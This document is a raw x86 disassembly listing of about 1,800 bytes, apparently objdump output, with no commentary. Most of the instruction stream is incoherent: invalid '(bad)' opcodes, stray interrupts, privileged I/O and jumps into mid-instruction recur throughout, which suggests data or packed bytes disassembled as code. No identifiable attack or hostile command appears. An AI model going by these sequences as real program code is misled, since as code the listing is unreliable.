  425b56:	shl    ebp,cl
  425b58:	sub    BYTE PTR [ebx-0x2b],dl
  425b5b:	xchg   DWORD PTR [ebx],edx
  425b5d:	int    0x96
  425b5f:	std    
  425b60:	int    0xa6
  425b62:	std    
  425b63:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  425b69:	in     eax,0x28
  425b6b:	shl    ebx,cl
  425b6d:	xchg   edx,eax
  425b6e:	push   ebx
  425b6f:	aad    0x87
  425b71:	adc    ecx,DWORD PTR [edx]
  425b73:	add    eax,0xd4cf
  425b78:	add    bh,cl
  425b7a:	push   es
  425b7b:	nop
  425b7c:	add    BYTE PTR [eax],al
  425b7e:	add    BYTE PTR [eax-0x33],dh
  425b81:	jbe    0x425b80
  425b83:	int    0x8d
  425b85:	std    
  425b86:	sar    bh,0x63
  425b89:	cmp    edi,DWORD PTR [ecx+0x3b]
  425b8c:	or     al,0xd3
  425b8e:	mov    ebp,0x28f2d392
  425b93:	push   ebx
  425b94:	shl    DWORD PTR [eax-0x33],cl
  425b97:	jbe    0x425bc5
  425b99:	iret   
  425b9a:	or     DWORD PTR [ecx-0x80],eax
  425b9d:	add    BYTE PTR [eax+0x3d01cd71],0x81
  425ba4:	add    BYTE PTR [eax-0x69ffb000],0x24
  425bab:	int    0x8d
  425bad:	push   esp
  425bae:	or     al,BYTE PTR [ecx-0x32528933]
  425bb4:	lea    esi,[ebp-0x6d82bad1]
  425bba:	shr    ebx,cl
  425bbc:	xchg   edx,eax
  425bbd:	int    0x8d
  425bbf:	lods   eax,DWORD PTR ds:[esi]
  425bc0:	int    0x96
  425bc2:	mov    ch,0x3b
  425bc4:	leave  
  425bc5:	cmp    ebx,edx
  425bc7:	push   ebx
  425bc8:	icebp  
  425bc9:	bound  eax,QWORD PTR [eax]
  425bcb:	(bad)  
  425bcc:	xor    al,0xd3
  425bce:	repnz sub BYTE PTR [eax],al
  425bd1:	(bad)  
  425bd2:	inc    esp
  425bd3:	mov    ebp,0xfb94
  425bd8:	int    0x76
  425bda:	lods   eax,DWORD PTR ds:[esi]
  425bdb:	int    0x8d
  425bdd:	mov    ch,0x2f
  425bdf:	inc    ebp
  425be0:	jge    0x425b74
  425be2:	shr    ebx,cl
  425be4:	xchg   edx,eax
  425be5:	int    0x8d
  425be7:	lods   eax,DWORD PTR ds:[esi]
  425be8:	int    0x96
  425bea:	mov    ch,0x3b
  425bec:	leave  
  425bed:	cmp    ebx,edx
  425bef:	push   ebx
  425bf0:	icebp  
  425bf1:	bound  eax,QWORD PTR [eax]
  425bf3:	(bad)  
  425bf4:	push   esp
  425bf5:	shl    edx,cl
  425bf7:	sub    BYTE PTR [eax],al
  425bf9:	(bad)  
  425bfa:	cmp    al,0xbd
  425bfc:	inc    esp
  425bfd:	sti    
  425bfe:	add    BYTE PTR [eax],al
  425c00:	int    0x76
  425c02:	std    
  425c03:	int    0x8d
  425c05:	std    
  425c06:	cmp    ecx,DWORD PTR [ebx+edx*8]
  425c09:	repnz sub BYTE PTR [ebx],bh
  425c0c:	jns    0x425be1
  425c0e:	mov    ebp,0xcdd35392
  425c13:	(bad)  
  425c14:	std    
  425c15:	int    0x96
  425c17:	std    
  425c18:	cmp    ecx,DWORD PTR [edi]
  425c1a:	shr    ebx,cl
  425c1c:	xchg   edx,eax
  425c1d:	cmp    edx,ebp
  425c1f:	shr    edx,cl
  425c21:	sub    BYTE PTR [ebx+0x13],dl
  425c24:	xchg   ebx,edx
  425c26:	int    0x8d
  425c28:	std    
  425c29:	int    0x96
  425c2b:	std    
  425c2c:	cmp    ecx,DWORD PTR [edi]
  425c2e:	shr    ebx,cl
  425c30:	xchg   edx,eax
  425c31:	cmp    edx,ebp
  425c33:	shr    edx,cl
  425c35:	sub    BYTE PTR [ebx+0x13],dl
  425c38:	xchg   ebx,edx
  425c3a:	int    0x8d
  425c3c:	std    
  425c3d:	int    0x96
  425c3f:	std    
  425c40:	cmp    ecx,DWORD PTR [edi]
  425c42:	shr    ebx,cl
  425c44:	xchg   edx,eax
  425c45:	cmp    edx,ebp
  425c47:	shr    edx,cl
  425c49:	sub    BYTE PTR [ebx+0x13],dl
  425c4c:	xchg   ebx,edx
  425c4e:	or     al,BYTE PTR [esi]
  425c50:	nop
  425c51:	add    BYTE PTR [eax],al
  425c53:	add    ch,cl
  425c55:	jbe    0x425cab
  425c57:	int    0x80
  425c59:	int    0x8d
  425c5b:	mov    ebp,0x3bbd96cd
  425c60:	(bad)  
  425c62:	aad    0xd3
  425c64:	jmp    0x425bf8
  425c66:	shr    edx,cl
  425c68:	sub    BYTE PTR [ebx+0x13],dl
  425c6b:	or     al,BYTE PTR ds:0xd4cf
  425c71:	add    ch,cl
  425c73:	jbe    0x425cc1
  425c75:	int    0x80
  425c77:	int    0x8d
  425c79:	std    
  425c7a:	int    0x96
  425c7c:	std    
  425c7d:	cmp    ecx,DWORD PTR [edi]
  425c7f:	shr    ebx,cl
  425c81:	xchg   edx,eax
  425c82:	int    0x6c
  425c84:	jo     0x425cc1
  425c86:	aad    0xd3
  425c88:	jmp    0xcf05:0xa135328
  425c8f:	aam    0x0
  425c91:	add    BYTE PTR [eax],al
  425c93:	int    0x76
  425c95:	sbb    al,0xcd
  425c97:	lea    ebx,[ebx+edi*1]
  425c9a:	or     al,0xd3
  425c9c:	repnz sub BYTE PTR [ebx],bh
  425c9f:	jns    0x425c74
  425ca1:	mov    ebp,0xcdd35392
  425ca6:	(bad)  
  425ca7:	std    
  425ca8:	int    0x96
  425caa:	std    
  425cab:	cmp    edx,ebp
  425cad:	cmp    ecx,DWORD PTR [edi]
  425caf:	shr    edx,cl
  425cb1:	sub    bl,dl
  425cb3:	jmp    0x425c47
  425cb5:	push   ebx
  425cb6:	adc    ecx,ebp
  425cb8:	xchg   esi,eax
  425cb9:	std    
  425cba:	int    0xa6
  425cbc:	std    
  425cbd:	cmp    ebx,DWORD PTR [ecx+0x492f3d3]
  425cc3:	hlt    
  425cc4:	call   ebx
  425cc6:	in     eax,0x28
  425cc8:	push   ebx
  425cc9:	aad    0x87
  425ccb:	adc    ecx,DWORD PTR [edx]
  425ccd:	add    eax,0xd4cf
  425cd2:	add    ch,cl
  425cd4:	jbe    0x425cd3
  425cd6:	int    0x8d
  425cd8:	std    
  425cd9:	add    al,0x2
  425cdb:	call   ebx
  425cdd:	repnz sub BYTE PTR [ebx],bh
  425ce0:	jns    0x425cb5
  425ce2:	mov    ebp,0xcdd35392
  425ce7:	(bad)  
  425ce8:	std    
  425ce9:	int    0x96
  425ceb:	std    
  425cec:	add    al,0xfb
  425cee:	(bad)  
  425cef:	cmp    ecx,DWORD PTR [edi]
  425cf1:	shr    edx,cl
  425cf3:	sub    bl,dl
  425cf5:	jmp    0x425c89
  425cf7:	push   ebx
  425cf8:	adc    eax,DWORD PTR [edi-0x272322d]
  425cfe:	int    0x96
  425d00:	std    
  425d01:	add    al,0xfb
  425d03:	(bad)  
  425d04:	cmp    ecx,DWORD PTR [edi]
  425d06:	shr    edx,cl
  425d08:	sub    bl,dl
  425d0a:	jmp    0x425c9e
  425d0c:	push   ebx
  425d0d:	adc    ecx,edi
  425d0f:	pop    ss
  425d10:	nop
  425d11:	add    BYTE PTR [eax],al
  425d13:	add    BYTE PTR [edx-0x33],ah
  425d16:	xchg   esi,eax
  425d17:	std    
  425d18:	int    0xa6
  425d1a:	std    
  425d1b:	xchg   ebx,edx
  425d1d:	cmp    ebx,DWORD PTR [ecx+0xaa58dcf]
  425d23:	int3   
  425d24:	push   es
  425d25:	aam    0x0
  425d27:	add    BYTE PTR [eax],al
  425d29:	int    0x76
  425d2b:	sub    al,0x4
  425d2d:	hlt    
  425d2e:	call   ebx
  425d30:	repz xchg edx,eax
  425d32:	shl    ebp,cl
  425d34:	sub    BYTE PTR [ebx-0x2b],dl
  425d37:	iret   
  425d38:	or     edi,ebp
  425d3a:	add    BYTE PTR [eax+0x3d01cd80],0x81
  425d41:	add    BYTE PTR [eax+0x50007162],0x0
  425d48:	xchg   esi,eax
  425d49:	and    al,0x6
  425d4b:	ins    DWORD PTR es:[edi],dx
  425d4c:	aam    0xbc
  425d4e:	int    0x76
  425d50:	in     eax,dx
  425d51:	int    0x8d
  425d53:	adc    DWORD PTR [edi],ebp
  425d55:	inc    ebp
  425d56:	jge    0x425cea
  425d58:	shr    ebx,cl
  425d5a:	xchg   edx,eax
  425d5b:	int    0xe3
  425d5d:	int    0x7d
  425d5f:	int    0x76
  425d61:	in     eax,dx
  425d62:	int    0x96
  425d64:	adc    DWORD PTR [ebx],edi
  425d66:	fidivr DWORD PTR [ebx]
  425d68:	lock shr DWORD PTR [ebp+0x4c76cd28],cl
  425d6f:	push   ebx
  425d70:	adc    ecx,ebp
  425d72:	xor    BYTE PTR [ebx-0x76],al
  425d75:	jo     0x425d44
  425d77:	xchg   esi,eax
  425d78:	push   esp
  425d79:	in     al,dx
  425d7a:	push   esp
  425d7b:	int    0x92
  425d7d:	int    0xa6
  425d7f:	push   eax
  425d80:	retf   0x5324
  425d83:	or     DWORD PTR [eax+ecx*4],esp
  425d86:	int    0x76
  425d88:	cmc    
  425d89:	int    0x8d
  425d8b:	stc    
  425d8c:	das    
  425d8d:	inc    ebp
  425d8e:	jge    0x425d22
  425d90:	shr    ebx,cl
  425d92:	xchg   edx,eax
  425d93:	int    0x8d
  425d95:	cmc    
  425d96:	int    0xa6
  425d98:	stc    
  425d99:	cmp    ecx,ecx
  425d9b:	cmp    ebx,ebp
  425d9d:	shl    edx,cl
  425d9f:	sub    ch,cl
  425da1:	lea    esi,[eax]
  425da3:	push   ebx
  425da4:	lds    eax,FWORD PTR [edi+0x4c76cd7d]
  425daa:	int    0x1c
  425dac:	inc    ebx
  425dad:	(bad)  
  425dae:	jo     0x425dba
  425db0:	lea    esi,[eax]
  425db2:	or     cl,0xec
  425db5:	xchg   ch,cl
  425db7:	xchg   esi,eax
  425db8:	push   esp
  425db9:	int    0x76
  425dbb:	dec    esp
  425dbc:	int    0x4a
  425dbe:	int    0x20
  425dc0:	xchg   DWORD PTR [esi-0x32e3f59c],ebx
  425dc6:	sbb    al,0xcd
  425dc8:	dec    edx
  425dc9:	xchg   ebp,ecx
  425dcb:	sub    eax,0xa808080
  425dd0:	lea    esi,[eax]
  425dd2:	int    0x4a
  425dd4:	int    0xa6
  425dd6:	push   eax
  425dd7:	xor    ecx,DWORD PTR [ecx*8+0x530a88a6]
  425dde:	int    0x80
  425de0:	int    0x4a
  425de2:	xchg   DWORD PTR [esp+edi*1-0x33],edi
  425de6:	jbe    0x425dd5
  425de8:	or     cl,BYTE PTR [ebp+0x118dcd0d]
  425dee:	das    
  425def:	inc    ebp
  425df0:	jge    0x425d84
  425df2:	shr    ebx,cl
  425df4:	xchg   edx,eax
  425df5:	int    0x8d
  425df7:	in     eax,dx
  425df8:	int    0xa6
  425dfa:	adc    DWORD PTR [ebx],edi
  425dfc:	leave  
  425dfd:	cmp    ebx,ebp
  425dff:	shl    edx,cl
  425e01:	sub    BYTE PTR [ebx-0x3b],dl
  425e04:	or     dh,BYTE PTR [esi+0x44]
  425e07:	int    0x76
  425e09:	xor    bl,ch
  425e0b:	les    eax,FWORD PTR [ecx+0x76cd8080]
  425e11:	in     eax,dx
  425e12:	int    0x8d
  425e14:	adc    DWORD PTR [edi],ebp
  425e16:	inc    ebp
  425e17:	jge    0x425dab
  425e19:	shr    ebx,cl
  425e1b:	xchg   edx,eax
  425e1c:	int    0x8d
  425e1e:	in     eax,dx
  425e1f:	int    0xa6
  425e21:	adc    ebx,edx
  425e23:	repnz sub ch,cl
  425e26:	lea    edx,[ebx+edi*1]
  425e29:	leave  
  425e2a:	cmp    ebx,ebp
  425e2c:	add    al,0xd3
  425e2e:	stc    
  425e2f:	push   ebx
  425e30:	(bad)
  425e33:	inc    ebx
  425e34:	shr    DWORD PTR [edi],cl
  425e36:	add    al,0xf7
  425e38:	add    BYTE PTR [eax+0x30a6cd80],0xcf
  425e3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e40:	dec    ebx
  425e41:	mov    BYTE PTR [ebx],dh
  425e43:	jge    0x425e4f
  425e45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e46:	xor    al,0xa
  425e48:	lea    edi,[ecx*8+0x76cdf18d]
  425e4f:	xchg   ebp,eax
  425e50:	das    
  425e51:	inc    ebp
  425e52:	rcl    DWORD PTR [edx-0x326d422d],cl
  425e58:	jbe    0x425e4b
  425e5a:	int    0xa6
  425e5c:	xchg   ebp,eax
  425e5d:	shr    DWORD PTR [ebp-0xa8932d8],cl
  425e63:	cmp    esi,eax
  425e65:	cmp    ebx,ebp
  425e67:	push   ebx
  425e68:	or     al,0xcd
  425e6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e6b:	stc    
  425e6c:	das    
  425e6d:	inc    ebp
  425e6e:	popf   
  425e6f:	xchg   edx,eax
  425e70:	or     dh,BYTE PTR [esi+0x54]
  425e73:	int    0x76
  425e75:	cmc    
  425e76:	push   ecx
  425e77:	out    0x54,al
  425e79:	add    al,0xd3
  425e7b:	dec    edx
  425e7c:	shr    esp,cl
  425e7e:	xchg   edx,eax
  425e7f:	int    0xa6
  425e81:	stc    
  425e82:	cmp    ebx,ebp
  425e84:	mov    DWORD PTR [esi+0x54b6d554],esp
  425e8a:	int    0xa6
  425e8c:	cmc    
  425e8d:	int    0x8d
  425e8f:	stc    
  425e90:	das    
  425e91:	inc    ebp
  425e92:	or     al,0x92
  425e94:	shr    DWORD PTR [ebp-0xa8932d8],cl
  425e9a:	shr    ebx,cl
  425e9c:	xchg   edx,eax
  425e9d:	int    0x8d
  425e9f:	stc    
  425ea0:	cmp    ecx,ebx
  425ea2:	shr    DWORD PTR [ebp+0x5476cd28],cl
  425ea8:	cmp    esp,ecx
  425eaa:	push   ebx
  425eab:	fcmovne st,st(5)
  425ead:	lea    esi,[edi+ebp*1]
  425eb0:	mov    ebx,0x2bc53389
  425eb5:	ror    ebp,cl
  425eb7:	(bad)  
  425eb8:	icebp  
  425eb9:	or     dh,BYTE PTR [esi+0x54]
  425ebc:	int    0x76
  425ebe:	xchg   ebp,eax
  425ebf:	das    
  425ec0:	inc    ebp
  425ec1:	rcl    DWORD PTR [edx-0x326d422d],cl
  425ec7:	jbe    0x425eba
  425ec9:	int    0xa6
  425ecb:	xchg   ebp,eax
  425ecc:	shr    DWORD PTR [ebp+0x3476cd28],cl
  425ed2:	das    
  425ed3:	mov    ebx,0xa6020180
  425ed8:	cmp    ebx,ebp
  425eda:	dec    edx
  425edb:	or     al,0x1
  425edd:	ror    DWORD PTR [edx-0x2b],cl
  425ee0:	mov    ebp,0xbdbfcb3b
  425ee5:	or     ah,BYTE PTR [ebx]
  425ee7:	and    eax,0x92d3352f
  425eec:	shr    DWORD PTR [ebp+0x37d65692],cl
  425ef2:	ficom  WORD PTR [ebx]
  425ef4:	cmp    ecx,DWORD PTR [esi+eiz*2]
  425ef7:	fidiv  WORD PTR [edi]
  425ef9:	ficom  WORD PTR [ebx]
  425efb:	(bad)  
  425efc:	ss inc ebx
  425efe:	or     al,0xd6
  425f00:	cs int 0x92
  425f03:	int    0x8d
  425f05:	xor    BYTE PTR [edi+0x548dcd81],al
  425f0b:	add    al,0x64
  425f0d:	mov    BYTE PTR [eax-0x6d32ce2c],al
  425f13:	int    0x8d
  425f15:	xor    BYTE PTR [edi-0x7772327f],al
  425f1b:	xchg   DWORD PTR [esi+0x54],esi
  425f1e:	int    0x89
  425f20:	or     DWORD PTR [eax-0x6dcb89fc],0x2f3c8d00
  425f2a:	push   es
  425f2b:	and    eax,DWORD PTR [eax]
  425f2d:	add    BYTE PTR [eax],al
  425f2f:	in     al,dx
  425f30:	test   DWORD PTR [edi+0x25230abd],edi
  425f36:	int    0x76
  425f38:	adc    al,0x81
  425f3a:	jbe    0x425f80
  425f3c:	leave  
  425f3d:	jbe    0x425fac
  425f3f:	scas   al,BYTE PTR es:[edi]
  425f40:	aaa    
  425f41:	ficom  WORD PTR [ebx]
  425f43:	or     ah,BYTE PTR [esi+0x6d76cd75]
  425f49:	int    0x8d
  425f4b:	jne    0x425f7c
  425f4d:	inc    ebp
  425f4e:	jge    0x425ee2
  425f50:	shr    ebx,cl
  425f52:	xchg   edx,eax
  425f53:	int    0x8d
  425f55:	ins    DWORD PTR es:[edi],dx
  425f56:	int    0xa6
  425f58:	jne    0x425f2d
  425f5a:	repnz sub ch,cl
  425f5d:	lea    ecx,[ebp+ecx*8-0x77]
  425f61:	cmp    ecx,ecx
  425f63:	cmp    ebx,ebp
  425f65:	push   ebx
  425f66:	(bad)
  425f69:	shl    esp,cl
  425f6b:	int    0x8d
  425f6d:	inc    esp
  425f6e:	inc    ebx
  425f6f:	mov    BYTE PTR [edi+0x54],dh
  425f72:	int    0x76
  425f74:	xor    BYTE PTR [edi+0x760a1476],al
  425f7a:	xor    ch,cl
  425f7c:	ins    BYTE PTR es:[edi],dx
  425f7d:	test   BYTE PTR [edx],cl
  425f7f:	jbe    0x425f95
  425f81:	int    0x76
  425f83:	in     eax,dx
  425f84:	int    0x8d
  425f86:	adc    DWORD PTR [edi],ebp
  425f88:	inc    ebp
  425f89:	jge    0x425f1d
  425f8b:	shr    ebx,cl
  425f8d:	xchg   edx,eax
  425f8e:	int    0x8d
  425f90:	in     eax,dx
  425f91:	int    0xa6
  425f93:	adc    DWORD PTR [ebx],edi
  425f95:	fnstsw WORD PTR [ebx]
  425f97:	leave  
  425f98:	push   ebx
  425f99:	(bad)
  425f9c:	sub    BYTE PTR [esi+0x76],bl
  425f9f:	adc    al,0x2f
  425fa1:	push   es
  425fa2:	mov    esi,0xcd0000ff
  425fa7:	(bad)  
  425fa8:	std    
  425fa9:	int    0x96
  425fab:	std    
  425fac:	cmp    ecx,DWORD PTR [edi]
  425fae:	shr    ebx,cl
  425fb0:	xchg   edx,eax
  425fb1:	sar    bh,0x9c
  425fb4:	cmp    esi,ecx
  425fb6:	shr    edx,cl
  425fb8:	sub    BYTE PTR [ebx+0x13],dl
  425fbb:	int    0x96
  425fbd:	std    
  425fbe:	int    0xa6
  425fc0:	std    
  425fc1:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425fc7:	popf   
  425fc8:	shl    ebp,cl
  425fca:	sub    BYTE PTR [ebx-0x2b],dl
  425fcd:	xchg   DWORD PTR [ebx],edx
  425fcf:	int    0x96
  425fd1:	std    
  425fd2:	int    0xa6
  425fd4:	std    
  425fd5:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425fdb:	popf   
  425fdc:	shl    ebp,cl
  425fde:	sub    BYTE PTR [ebx-0x2b],dl
  425fe1:	xchg   DWORD PTR [ebx],edx
  425fe3:	int    0x96
  425fe5:	std    
  425fe6:	int    0xa6
  425fe8:	std    
  425fe9:	cmp    ebx,DWORD PTR [ecx-0xc2c62c5]
  425fef:	xchg   edx,eax
  425ff0:	shl    ebp,cl
  425ff2:	sub    BYTE PTR [ebx-0x2b],dl
  425ff5:	xchg   DWORD PTR [ebx],edx
  425ff7:	or     cl,bh
  425ff9:	nop
  425ffa:	add    BYTE PTR [eax],al
  425ffc:	add    ch,cl
  425ffe:	lea    edx,[eax-0x33]
  426001:	xchg   esi,eax
  426002:	mov    ebp,0x3bbda6cd
  426007:	cdq    
  426008:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  42600e:	in     eax,0x28
  426010:	push   ebx
  426011:	aad    0xa
  426013:	int3   
  426014:	pop    ss
  426015:	aam    0x0
  426017:	add    BYTE PTR [eax],al
  426019:	int    0x8d
  42601b:	dec    esp
  42601c:	int    0x89
  42601e:	int    0x96
  426020:	std    
  426021:	int    0xa6
  426023:	std    
  426024:	int    0x7e
  426026:	jo     0x426063
  426028:	cdq    
  426029:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  42602f:	in     eax,0x28
  426031:	push   ebx
  426032:	aad    0xa
  426034:	int3   
  426035:	pop    ss
  426036:	aam    0x0
  426038:	add    BYTE PTR [eax],al
  42603a:	int    0x8d
  42603c:	sbb    al,0xcd
  42603e:	xchg   esi,eax
  42603f:	sbb    al,0x3b
  426041:	icebp  
  426042:	shr    edx,cl
  426044:	sub    BYTE PTR [ebx],bh
  426046:	psrlq  mm5,mm3
  426049:	xchg   edx,eax
  42604a:	push   ebx
  42604b:	adc    ecx,ebp
  42604d:	xchg   esi,eax
  42604e:	std    
  42604f:	int    0xa6
  426051:	std    
  426052:	cmp    ebx,DWORD PTR [ebp+0x3bfd76cd]
  426058:	cdq    
  426059:	shl    ebp,cl
  42605b:	sub    bl,dl
  42605d:	repz xchg edx,eax
  42605f:	push   ebx
  426060:	aad    0xcd
  426062:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426063:	std    
  426064:	cmp    edi,DWORD PTR [ecx+0x4]
  426067:	hlt    
  426068:	call   ebx
  42606a:	mov    ebp,0x28e5d392
  42606f:	push   ebx
  426070:	lds    eax,FWORD PTR [edi+0x17cc0af1]
  426076:	aam    0x0
  426078:	add    BYTE PTR [eax],al
  42607a:	int    0x8d
  42607c:	std    
  42607d:	int    0x96
  42607f:	std    
  426080:	cmp    ecx,DWORD PTR [edi]
  426082:	shr    ebx,cl
  426084:	xchg   edx,eax
  426085:	sar    bh,0x9c
  426088:	cmp    esi,ecx
  42608a:	shr    edx,cl
  42608c:	sub    BYTE PTR [ebx+0x13],dl
  42608f:	int    0x96
  426091:	std    
  426092:	int    0xa6
  426094:	std    
  426095:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42609b:	popf   
  42609c:	shl    ebp,cl
  42609e:	sub    BYTE PTR [ebx-0x2b],dl
  4260a1:	xchg   DWORD PTR [ebx],edx
  4260a3:	int    0x96
  4260a5:	std    
  4260a6:	int    0xa6
  4260a8:	std    
  4260a9:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  4260af:	popf   
  4260b0:	shl    ebp,cl
  4260b2:	sub    BYTE PTR [ebx-0x2b],dl
  4260b5:	xchg   DWORD PTR [ebx],edx
  4260b7:	iret   
  4260b8:	xchg   esi,eax
  4260b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260ba:	or     dl,BYTE PTR ds:0xd4cf
  4260c0:	add    bh,cl
  4260c2:	iret   
  4260c3:	nop
  4260c4:	add    BYTE PTR [eax],al
  4260c6:	add    BYTE PTR [ecx-0x33],dh
  4260c9:	(bad)  
  4260ca:	std    
  4260cb:	int    0x96
  4260cd:	std    
  4260ce:	cmp    ecx,DWORD PTR [edi]
  4260d0:	int    0xd6
  4260d2:	sub    al,0x3b
  4260d4:	icebp  
  4260d5:	shr    ebx,cl
  4260d7:	xchg   edx,eax
  4260d8:	shr    edx,cl
  4260da:	sub    BYTE PTR [ebx+0x13],dl
  4260dd:	jno    0x4260ae
  4260df:	pop    es
  4260e0:	out    dx,eax
  4260e1:	add    BYTE PTR [eax+0x7cd7080],0x3d
  4260e8:	add    DWORD PTR [eax+0x500080],0x7cd2496
  4260f2:	add    DWORD PTR [ecx+0x760a8080],eax
  4260f8:	dec    esp
  4260f9:	int    0x76
  4260fb:	mov    ch,cl
  4260fd:	mov    BYTE PTR [edi-0x72f5b373],al
  426103:	dec    esp
  426104:	int    0x8d
  426106:	cmc    
  426107:	int    0x96
  426109:	stc    
  42610a:	das    
  42610b:	inc    ebp
  42610c:	jecxz  0x4260a0
  42610e:	shl    ebx,cl
  426110:	xchg   edx,eax
  426111:	int    0x96
  426113:	cmc    
  426114:	int    0xd6
  426116:	stc    
  426117:	cmp    esi,edi
  426119:	shr    edx,cl
  42611b:	sub    ch,cl
  42611d:	xchg   esi,eax
  42611e:	cmc    
  42611f:	cmp    esi,eax
  426121:	push   ebx
  426122:	bswap  ebp
  426124:	(bad)  
  426125:	stc    
  426126:	das    
  426127:	inc    ebp
  426128:	sti    
  426129:	xchg   edx,eax
  42612a:	shr    edi,cl
  42612c:	xchg   edx,eax
  42612d:	int    0xd6
  42612f:	cmc    
  426130:	int    0xa6
  426132:	stc    
  426133:	cmp    ebx,ecx
  426135:	cmp    ebx,ebp
  426137:	push   ebx
  426138:	aad    0x87
  42613a:	adc    ecx,ebp
  42613c:	xchg   esi,eax
  42613d:	cmc    
  42613e:	sar    DWORD PTR [ecx-0x62932d8],cl
  426144:	das    
  426145:	inc    ebp
  426146:	sti    
  426147:	xchg   edx,eax
  426148:	shr    edi,cl
  42614a:	xchg   edx,eax
  42614b:	int    0xd6
  42614d:	cmc    
  42614e:	int    0xa6
  426150:	stc    
  426151:	cmp    ebx,ecx
  426153:	cmp    ebx,ebp
  426155:	push   ebx
  426156:	aad    0x87
  426158:	adc    ecx,ebp
  42615a:	xchg   esi,eax
  42615b:	cmc    
  42615c:	sar    DWORD PTR [ecx-0x62932d8],cl
  426162:	das    
  426163:	inc    ebp
  426164:	sti    
  426165:	xchg   edx,eax
  426166:	shr    edi,cl
  426168:	xchg   edx,eax
  426169:	int    0xd6
  42616b:	cmc    
  42616c:	cmp    ebx,ecx
  42616e:	int    0xe6
  426170:	stc    
  426171:	cmp    eax,DWORD PTR [eax]
  426173:	push   ebx
  426174:	fld    DWORD PTR [edi+0x707113]
  42617a:	(bad)  
  42617b:	dec    esp
  42617c:	sar    DWORD PTR [ecx-0x12c242d8],cl
  426182:	add    BYTE PTR [eax],al
  426184:	int    0x76
  426186:	or     eax,0xcb63a8aa
  42618b:	rcl    BYTE PTR [eax-0x80],cl
  42618e:	xchg   esi,eax
  42618f:	int    0xed
  426191:	add    al,0xed
  426193:	inc    esp
  426194:	pop    ebx
  426195:	cwde   
  426196:	call   0x76c9:0xcb3bdd3b
  42619d:	popf   
  42619e:	(bad)  
  42619f:	aaa    
  4261a0:	ficom  WORD PTR [ebx]
  4261a2:	pop    ebp
  4261a3:	mov    ebp,0xa25230a
  4261a8:	jbe    0x42614f
  4261aa:	leave  
  4261ab:	jbe    0x42616a
  4261ad:	xchg   ecx,eax
  4261ae:	aaa    
  4261af:	ficom  WORD PTR [ebx]
  4261b1:	or     dh,BYTE PTR [esi-0x13]
  4261b4:	leave  
  4261b5:	jbe    0x4261a4
  4261b7:	dec    ecx
  4261b8:	mov    al,ds:0x76c93586
  4261bd:	cmc    
  4261be:	dec    ecx
  4261bf:	lahf   
  4261c0:	xchg   BYTE PTR ds:0x691176c9,dh
  4261c6:	and    DWORD PTR [esi+0x1176c935],eax
  4261cc:	cmp    DWORD PTR [ecx],esp
  4261ce:	xchg   BYTE PTR ds:0x49f976c9,dh
  4261d4:	and    DWORD PTR [ebp+esi*1+0xa8476cf],eax
  4261db:	jbe    0x4261d6
  4261dd:	int    0x76
  4261df:	sbb    al,0xcd
  4261e1:	shl    BYTE PTR ds:0xcd808081,1
  4261e7:	jbe    0x426205
  4261e9:	int    0x8d
  4261eb:	sbb    al,0xcd
  4261ed:	add    DWORD PTR ds:0xcd808081,ebp
  4261f3:	xor    ch,cl
  4261f5:	pop    esp
  4261f6:	xchg   eax,esp
  4261f8:	fs int 0x96
  4261fb:	popf   
  4261fc:	int    0xa
  4261fe:	and    eax,0xa808081
  426203:	out    0xb5,al
  426205:	int    0xe6
  426207:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426208:	das    
  426209:	inc    ebp
  42620a:	add    edx,DWORD PTR [edx-0x326def2d]
  426210:	out    0x9d,al
  426212:	int    0xa6
  426214:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426215:	adc    bh,bl
  426217:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426218:	mov    esi,0xdd3b4229
  42621d:	shr    ecx,cl
  42621f:	sub    ch,cl
  426221:	pop    esi
  426222:	push   ebx
  426223:	aad    0x43
  426225:	(bad)  
  426227:	nop
  426228:	int    0x18
  42622a:	or     dl,BYTE PTR [esi+0x1496cdf9]
  426230:	int    0x96
  426232:	xor    ch,cl
  426234:	xchg   esi,eax
  426235:	dec    esp
  426236:	iret   
  426237:	xchg   esi,eax
  426238:	lods   eax,DWORD PTR ds:[esi]
  426239:	bound  eax,QWORD PTR [eax]
  42623b:	(bad)  
  42623c:	stc    
  42623d:	jno    0x4262af
  42623f:	cwde   
  426240:	add    dh,dl
  426242:	sbb    al,0xcf
  426244:	jbe    0x4261fb
  426246:	add    dh,dl
  426248:	mov    BYTE PTR [eax],al
  42624a:	(bad)  
  42624b:	cmc    
  42624c:	add    dh,dl
  42624e:	adc    DWORD PTR [eax],eax
  426250:	(bad)  
  426251:	in     eax,dx
  426252:	jo     0x426223
  426254:	jbe    0x426253
  426256:	jo     0x426215
  426258:	stos   BYTE PTR es:[edi],al
  426259:	clc    
  42625a:	add    BYTE PTR [eax],al
  42625c:	or     dh,BYTE PTR [esi+0x1c]
  42625f:	int    0x76
  426261:	sbb    al,0xcd
  426263:	lea    esp,[edx+ecx*1]
  426266:	outs   dx,BYTE PTR ds:[esi]
  426267:	adc    al,0xcd
  426269:	jbe    0x42628f
  42626b:	leave  
  42626c:	add    BYTE PTR [edi-0x327f7f80],0x76
  426273:	lods   eax,DWORD PTR ds:[esi]
  426274:	int    0x8d
  426276:	and    al,0xa
  426278:	outs   dx,BYTE PTR ds:[esi]
  426279:	test   ch,cl
  42627b:	jbe    0x4262ad
  42627d:	int    0x8d
  42627f:	and    al,0xa
  426281:	outs   dx,BYTE PTR ds:[esi]
  426282:	mov    ch,cl
  426284:	jbe    0x42629a
  426286:	int    0x8d
  426288:	and    al,0xa
  42628a:	outs   dx,BYTE PTR ds:[esi]
  42628b:	dec    esp
  42628c:	int    0x76
  42628e:	and    al,0xc9
  426290:	ins    BYTE PTR es:[edi],dx
  426291:	and    al,0x81
